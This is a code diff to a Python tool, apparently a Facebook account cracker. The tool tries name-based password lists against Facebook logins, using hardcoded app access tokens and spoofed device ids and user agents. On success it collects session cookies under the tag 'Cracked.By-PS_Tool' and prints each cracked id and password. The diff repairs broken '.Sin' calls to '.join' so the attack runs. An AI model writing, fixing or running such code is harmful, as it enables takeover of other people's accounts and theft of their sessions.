@@ -370,14 +370,14 @@ class __PSS__:
 
             for pw in passlist:
                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                ua = smart_ua()  # <-- تم التحديث هنا
+                ua = smart_ua()
                 accessToken = random.choice([
                     '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                     '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                 ])
                 random_seed = random.Random()
                 pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
-                adid = ''.Sin(random_seed.choices(string.hexdigits, k=16))
+                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                 device_id = str(uuid.uuid4())
                 __locale__ = {
                     "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
@@ -441,7 +441,7 @@ class __PSS__:
                     continue
 
                 if 'session_key' in po:
-                    ckkk = ';'.Sin(i['name'] + '=' + i['value'] for i in po['session_cookies'])
+                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                     print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')
@@ -503,14 +503,14 @@ class __PSS__:
                 ln = fn
             for pw in passlist:
                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                ua = smart_ua()  # <-- تم التحديث هنا
+                ua = smart_ua()
                 accessToken = random.choice([
                     '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                     '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                 ])
                 random_seed = random.Random()
                 pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
-                adid = ''.Sin(random_seed.choices(string.hexdigits, k=16))
+                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                 device_id = str(uuid.uuid4())
                 __locale__ = {
                     "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
@@ -567,7 +567,7 @@ class __PSS__:
                 twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
                 po = requests.post(url, data=data, headers=headers).json()
                 if 'session_key' in po:
-                    ckkk = ';'.Sin(i['name'] + '=' + i['value'] for i in po['session_cookies'])
+                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                     print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')
@@ -626,14 +626,14 @@ class __PSS__:
                 ln = fn
             for pw in passlist:
                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                ua = smart_ua()  # <-- تم التحديث هنا
+                ua = smart_ua()
                 accessToken = random.choice([
                     '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                     '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                 ])
                 random_seed = random.Random()
                 pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
-                adid = str("".Sin(random_seed.choices(string.hexdigits, k=16)))
+                adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                 device_id = str(uuid.uuid4())
                 __locale__ = {
                     "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
@@ -686,7 +686,7 @@ class __PSS__:
                 twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
                 po = requests.post(url, data=data, headers=headers).json()
                 if 'session_key' in po:
-                    ckkk = ';'.Sin(i['name'] + '=' + i['value'] for i in po['session_cookies'])
+                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                     print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')
